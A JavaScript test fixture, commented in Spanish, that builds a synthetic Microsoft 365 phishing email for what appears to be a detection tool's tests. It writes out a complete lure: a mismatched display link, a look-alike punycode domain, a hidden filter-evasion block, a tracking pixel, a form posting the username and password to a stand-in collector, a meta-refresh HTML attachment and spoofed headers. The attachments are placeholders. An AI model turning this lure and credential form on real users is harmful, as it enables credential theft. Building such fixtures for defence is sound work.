/**
 * Correo de phishing sintético que usan las pruebas.
 *
 * Vive aquí, en el código de test, y no como fichero suelto en el repo: así no
 * se publica en la web ni hay un .eml dando vueltas por la carpeta. Todo el
 * contenido es inventado y los "adjuntos" son texto plano, no hay malware.
 */

const HTML = `<html><body style="font-family:Segoe UI,Arial">
<div style="font-size:0;color:#ffffff">factura seguimiento ref 88213 correo legitimo confianza</div>
<p>Estimado usuario,</p>
<p><b>Su buz&oacute;n de Microsoft 365 ser&aacute; suspendido en 24 horas.</b>
Debe verificar su contrase&ntilde;a para evitar el bloqueo de la cuenta.</p>
<p><a href="http://microsoft-login.verify-account.tk/o365/login.php?id=dGFyZ2V0">
https://login.microsoftonline.com/verify</a></p>
<p><a href="http://185.199.110.153:8080/session/update">Revisar actividad reciente</a></p>
<p><a href="https://xn--micrsoft-y0a.com/portal">Portal de administraci&oacute;n</a></p>
<p><a href="https://bit.ly/3xQzPla">Descargar informe</a></p>
<img src="http://track.verify-account.tk/px.gif?u=dXNlcg==" width="1" height="1">
<form action="http://microsoft-login.verify-account.tk/collect.php" method="post">
  <input type="text" name="user" placeholder="Correo">
  <input type="password" name="pass" placeholder="Contrase&ntilde;a">
  <input type="submit" value="Verificar">
</form>
<p style="font-size:9px;color:#888">Microsoft Corporation, One Microsoft Way, Redmond WA</p>
</body></html>`;

const PLAIN = `Estimado usuario,

Su buzon de Microsoft 365 sera suspendido en 24 horas. Verifique su contrasena:
http://microsoft-login.verify-account.tk/o365/login.php?id=dGFyZ2V0

Soporte Microsoft 365
`;

const HTML_ATTACH = `<!doctype html><meta http-equiv="refresh" content="0;url=http://microsoft-login.verify-account.tk/o365/login.php">
<title>Outlook</title><body>Cargando su sesion...</body>`;

const DOCM = 'PK' + 'FAKE-OOXML-CON-MACROS-PARA-PRUEBAS'.repeat(12);

function qp(text) {
  return text.split('\n').map(linea => {
    let out = '';
    for (const ch of linea) {
      const c = ch.codePointAt(0);
      if (ch === ' ') out += ' ';
      else if (c >= 33 && c <= 126 && ch !== '=') out += ch;
      else out += Array.from(new TextEncoder().encode(ch))
        .map(b => '=' + b.toString(16).toUpperCase().padStart(2, '0')).join('');
    }
    return out;
  }).join('\n');
}

function b64(str, esUtf8) {
  const bytes = esUtf8 ? new TextEncoder().encode(str)
    : Uint8Array.from(str, c => c.charCodeAt(0) & 0xff);
  const s = Buffer.from(bytes).toString('base64');
  return s.match(/.{1,76}/g).join('\n');
}

/** El correo completo, con CRLF como manda el RFC, en bytes. */
export function emlDeEjemplo() {
  const eml = `Received: from mx1.corp-victima.es (mx1.corp-victima.es [10.20.0.5])
 by imap.corp-victima.es (Postfix) with ESMTPS id 9F2B14A21C
 for <maria.lopez@corp-victima.es>; Mon, 10 Aug 2026 09:14:52 +0200 (CEST)
Received: from vps-4412.cheap-hosting.ru (vps-4412.cheap-hosting.ru [185.220.101.44])
 by mx1.corp-victima.es (Postfix) with ESMTP id 3D19A22B07
 for <maria.lopez@corp-victima.es>; Mon, 10 Aug 2026 09:14:31 +0200 (CEST)
Received: from localhost (unknown [45.155.205.233])
 by vps-4412.cheap-hosting.ru (Exim 4.94) with SMTP id 1rXk2P-0007hQ-2s;
 Mon, 10 Aug 2026 07:12:03 +0000
Authentication-Results: mx1.corp-victima.es;
 spf=fail (sender IP is 185.220.101.44) smtp.mailfrom=bounce@cheap-hosting.ru;
 dkim=none (message not signed) header.d=none;
 dmarc=fail action=quarantine header.from=microsoft.com;
 compauth=fail reason=001
Received-SPF: fail (corp-victima.es: domain of cheap-hosting.ru does not designate
 185.220.101.44 as permitted sender) client-ip=185.220.101.44;
 envelope-from=bounce@cheap-hosting.ru;
Return-Path: <bounce@cheap-hosting.ru>
From: =?utf-8?B?TWljcm9zb2Z0IDM2NSBTZWd1cmlkYWQ=?= <no-reply@micros0ft-security.tk>
Reply-To: "Soporte O365" <recovery.desk@mail-verify.xyz>
To: maria.lopez@corp-victima.es
Subject: =?utf-8?Q?RE=3A_ACCI=C3=93N_REQUERIDA=3A_su_cuenta_ser=C3=A1_suspendida_en_24_horas?=
Date: Mon, 10 Aug 2026 09:12:01 +0200
Message-ID: <20260810071201.3D19A22B07@vps-4412.cheap-hosting.ru>
X-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)
X-Originating-IP: [45.155.205.233]
X-Priority: 1 (Highest)
Importance: High
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=_outer_9911"

--=_outer_9911
Content-Type: multipart/alternative; boundary="=_alt_5522"

--=_alt_5522
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable

${qp(PLAIN)}
--=_alt_5522
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: base64

${b64(HTML, true)}
--=_alt_5522--

--=_outer_9911
Content-Type: text/html; name="Factura_88213.pdf.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Factura_88213.pdf.html"

${b64(HTML_ATTACH, true)}
--=_outer_9911
Content-Type: application/vnd.ms-word.document.macroEnabled.12; name="Detalles.docm"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Detalles.docm"

${b64(DOCM, false)}
--=_outer_9911--
`.replace(/\n/g, '\r\n');
  return new TextEncoder().encode(eml);
}
